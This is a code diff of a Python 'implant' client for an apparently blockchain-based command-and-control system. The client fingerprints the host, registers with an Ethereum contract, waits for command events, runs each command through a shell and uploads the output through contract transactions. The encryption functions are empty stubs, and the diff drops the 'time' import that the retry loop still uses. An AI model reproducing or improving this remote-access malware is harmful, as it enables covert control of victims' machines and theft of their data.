@@ -1,4 +1,4 @@
-import time, sys, json, signal, shutil, atexit, yaml
+import argparse, json, signal, shutil, atexit, yaml
 from os.path import join as opj
 from web3 import Web3, HTTPProvider
 
@@ -9,7 +9,10 @@ from Util.Process import waitFor, kill_proc, runCommandSync
 from Util.WalletOperations import *
 from Util.EtherLogEvents import *
 from Util.LogWrapper import LogWrapper
-import subprocess as sp
+from Util.TransactionLogger import TransactionLogger
+
+
+CLIENT_CONF_FILE = opj('conf', 'clientConf.yaml')
 
 REGISTRATION_CONFIRMATION_EVENT_NAME = 'InstanceRegistered'
 COMMAND_PENDING_EVENT_NAME = 'CommandPending'
@@ -17,10 +20,11 @@ COMMAND_PENDING_EVENT_NAME = 'CommandPending'
 
 class ClientCommands:
 
-	def __init__(self, confFile, sessionId = None):
+	def __init__(self, confFile, sessionId = None, transactionLogFilename = 'transaction.log'):
 		conf = yaml.safe_load(open(confFile))
 		self.opMode = conf['opMode']
 		l.info('Working in',self.opMode,'mode')
+		
 		self.contractAddress = conf['contract']['address']
 		self.contractAbi = conf['contract']['abi']
 
@@ -52,9 +56,14 @@ class ClientCommands:
 		self.sessionId = sessionId
 		self.gasLimit_ev = conf['gasLimit_ev']
 
+		self.transactionCostLogger = TransactionLogger(transactionLogFilename, self.web3)
 
 
 	def loadContract(self):
+		'''
+		Loads a contract by address
+		:return:
+		'''
 		l.info('loading contract from:', self.contractAddress)
 		l.debug('contract abi:', self.contractAbi)
 
@@ -62,9 +71,16 @@ class ClientCommands:
 		return contract
 
 	def registered(self):
+		'''
+		:return: True if contract has already successfully registered
+		'''
 		return self.sessionId != None
 
 	def registerInstance(self):
+		'''
+		Register the instance with the controller
+		:return:
+		'''
 		if self.registered():
 			return True
 
@@ -83,7 +99,7 @@ class ClientCommands:
 																topicFilters=[self.web3.sha3(self.address)])
 			
 			tx = waitFor(lambda: self.web3.eth.getTransactionReceipt(txHash), emptyResponse=None, pollInterval=1, maxRetries=500)
-			transactionCostLogger.insert(self.web3, txHash, 'registerInstance', len(machineId), t)
+			self.transactionCostLogger.insert(txHash, 'registerInstance', len(machineId))
 			if not tx or tx['gasUsed'] == self.gasLimit_ev:
 				raise ValueError('Error in transaction execution. maximum gas used. out of gas or permission issue',tx)
 			
@@ -106,6 +122,11 @@ class ClientCommands:
 
 
 	def doWork(self, shell_cmd):
+		'''
+		Run a give command. Return results
+		:param shell_cmd:
+		:return:
+		'''
 		try:
 			proc = runCommandSync(shell_cmd, shell=True)
 			ret = { 'status': proc.returncode,
@@ -117,77 +138,95 @@ class ClientCommands:
 		return json.dumps(ret)
 
 	def uploadWorkResults(self, cmdId, workResults):
+		'''
+		Sends work results back to controller
+		:param cmdId:
+		:param workResults:
+		:return:
+		'''
 		machineId = OsInteractions.fingerprintMachine()
 		sessionAndMachineIdHash = sha3AsBytes(self.sessionId + machineId)
 		#function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId)
 		txHash = self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': self.gasLimit_ev})
 		
 		l.info("sending results of cmdId",cmdId,"to server. txHash:",txHash,"result:", workResults,'...')
-		transactionCostLogger.insert(self.web3, txHash, 'uploadWorkResults',len(workResults), t)
+		self.transactionCostLogger.insert(txHash, 'uploadWorkResults',len(workResults))
 		
 	def decryptMessageFromServer(self, msg, encrypt=True):
-		# TODO compelete
-		# if encrypt:
-		# 	alice = pyelliptic.ecc()
-		# 	msg = alice.encrypt(msg,self.ownerPubKey)
+		'''
+		Decrypt a message using wallet private key
+		:param msg:
+		:param encrypt:
+		:return:
+		'''
+		# TODO complete. Need to find a proper elliptic curve crypto library in python
 		return msg
 
 	def encryptMessageForServer(self, msg, decrypt = True):
-		# TODO compelete
-		# if decrypt:
-		# 	bob = pyelliptic.ecc()
-		# 	bob.decrypt()
+		'''
+		Encrypt a message for an server using its public key
+		:param msg:
+		:param decrypt:
+		:return:
+		'''
+		# TODO complete. Need to find a proper elliptic curve crypto library in python
 		return msg
 
+	def run(self):
+		'''
+		Run the client main function: register. once register, start listening to incoming commands.
+		:return:
+		'''
+		sleep = 1
+		while not self.registered():
+			l.info('trying to register instance')
+			l.info('Account Balance: ', str(getAccountBalance(self.web3, self.address)))
+			success = self.registerInstance()
+			if not success:
+				time.sleep(sleep)
+				sleep *= 2
 
+		if self.registered():
+			try:
+				l.info('instance is now registered with server. waiting for work...')
+				self.commandFilter, eventABI = createLogEventFilter(COMMAND_PENDING_EVENT_NAME,
+									 self.contractAbi,
+									 self.contractAddress,
+									 self.web3,
+									 topicFilters = [self.web3.sha3(self.address)])
+				
+				def onCommandArrival(tx):
+					try:
+						l.debug('new command event:',tx)
 
+						command = getLogEventArg(tx, eventABI,'command')
+						cmdId = getLogEventArg(tx, eventABI, 'cmdId')
 
-	def mainLoop(self):
-			sleep = 1
-			while not self.registered():
-				l.info('trying to register instance')
-				l.info('Account Balance: ', str(getAccountBalance(self.web3, self.address)))
-				success = self.registerInstance()
-				if not success:
-					time.sleep(sleep)
-					sleep *= 2
+						commandDec = self.decryptMessageFromServer(command)
+						l.info('Decrypted a new command from server. id:',cmdId,'cmd:',commandDec)
 
-			if self.registered():
-				try:
-					l.info('instance is now registered with server. waiting for work...')
-					self.commandFilter, eventABI = createLogEventFilter(COMMAND_PENDING_EVENT_NAME,
-										 self.contractAbi,
-										 self.contractAddress,
-										 self.web3,
-										 topicFilters = [self.web3.sha3(self.address)])
-					
-					def onCommandArrival(tx):
-						try:
-							l.debug('new command event:',tx)
-	
-							command = getLogEventArg(tx, eventABI,'command')
-							cmdId = getLogEventArg(tx, eventABI, 'cmdId')
-	
-							commandDec = self.decryptMessageFromServer(command)
-							l.info('Decrypted a new command from server. id:',cmdId,'cmd:',commandDec)
-	
-							workResults = self.doWork(commandDec)
-							l.info('Command',cmdId, 'execution complete:', workResults[0:100],'...')
-	
-							workResultsEnc = self.encryptMessageForServer(workResults)
-							self.uploadWorkResults(cmdId, workResultsEnc)
-						except Exception as e:
-							l.error("Error responding to command request:", e)
-					self.commandFilter.watch(onCommandArrival)
-					
-				except Exception as e:
-					l.error("Error in event watcher registration:", e)
-					if self.commandFilter and self.commandFilter.running:
-						self.commandFilter.stopWatching()
+						workResults = self.doWork(commandDec)
+						l.info('Command',cmdId, 'execution complete:', workResults[0:100],'...')
+
+						workResultsEnc = self.encryptMessageForServer(workResults)
+						self.uploadWorkResults(cmdId, workResultsEnc)
+					except Exception as e:
+						l.error("Error responding to command request:", e)
+				self.commandFilter.watch(onCommandArrival)
+				
+			except Exception as e:
+				l.error("Error in event watcher registration:", e)
+				if self.commandFilter and self.commandFilter.running:
+					self.commandFilter.stopWatching()
 
 
 
 	def runGethNode(self, conf):
+		'''
+		Runs the local light geth node
+		:param conf:
+		:return:
+		'''
 		gethLockFile = opj(conf['BlockChainData'], 'LOCK.pid')
 		if (os.path.isfile(gethLockFile)):
 			with open (gethLockFile) as f:
@@ -240,18 +279,27 @@ class ClientCommands:
 		return proc
 
 if __name__ == "__main__":
+	parser = argparse.ArgumentParser(
+		prog='Implant functionaliy',
+		description='This utility is the so-called implant implementation. It is supposed to be run from a client package generated by serverCommands'
+		            'It will contain its own generated config file. After it runs, it will run its own geth, contact the contract and register with it.'
+		            'If successful, it will start a listener for incoming commands.'
+		            ' Run with python -i to get shell. use object cc to call for different commands.'
+	)
+	parser.add_argument("baseDir", help="Location of base directory. all conf, scripts and bin files are assumed to exist in a subdirectory of base dir.")
+	parser.add_argument("--sessionid", default=None, help="an existing sessionId for pre registered clients. Will cause client to skip initial registration process")
+	parser.add_argument("--transactionLogFile", default=opj('logs','transaction.log'), help="Location of transaction log file.")
+	args = parser.parse_args()
 	
-	os.chdir(sys.argv[1])
+	os.chdir(args.baseDir)
+	l = LogWrapper.getDefaultLogger()
+	l.info ("base dir:", args.baseDir)
 	
-	l = LogWrapper.getLogger()
-	t = LogWrapper.getLogger(name='transaction', filename=opj('..','..','logs', 'transaction.log'))
+	#sessionId = args.sessionid #sys.argv[3] if len(sys.argv) > 3 else None
 	
-	l.info ("base dir ",sys.argv[1])
+	#transactionLogFilename= args.transactionLogFile #opj('..','..','logs', 'transaction.log')
+	
+	cc = ClientCommands(CLIENT_CONF_FILE, args.sessionid, args.transactionLogFile)
 
-	confFile = sys.argv[2]
-	
-	sessionId = sys.argv[3] if len(sys.argv) > 3 else None
-	cc = ClientCommands(confFile, sessionId)
-
-	cc.mainLoop()
+	cc.run()
 	
